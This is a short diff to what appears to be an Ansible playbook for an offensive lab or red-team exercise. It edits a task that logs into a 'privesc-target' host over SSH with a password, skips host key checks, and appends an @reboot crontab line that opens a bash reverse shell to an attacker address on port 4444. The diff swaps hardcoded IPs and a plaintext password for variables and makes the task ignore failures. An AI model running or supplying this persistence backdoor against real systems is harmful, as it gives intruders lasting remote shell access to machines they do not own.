@@ -1,3 +1,4 @@
 ---
 - name: Persistence - Add reverse shell to cronjob on privesc-target
-  shell: "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@192.168.254.132 \"echo '@reboot bash -c \\\"bash -i >& /dev/tcp/192.168.254.130/4444 0>&1\\\"' | sudo tee -a /etc/crontab\""
+  shell: "sshpass -p '{{ ssh_password }}' ssh -o StrictHostKeyChecking=no {{ ssh_user }}@{{ privesc_target_ip }} \"echo '@reboot bash -c \\\"bash -i >& /dev/tcp/{{ attacker_ip }}/4444 0>&1\\\"' | sudo tee -a /etc/crontab\""
+  failed_when: false
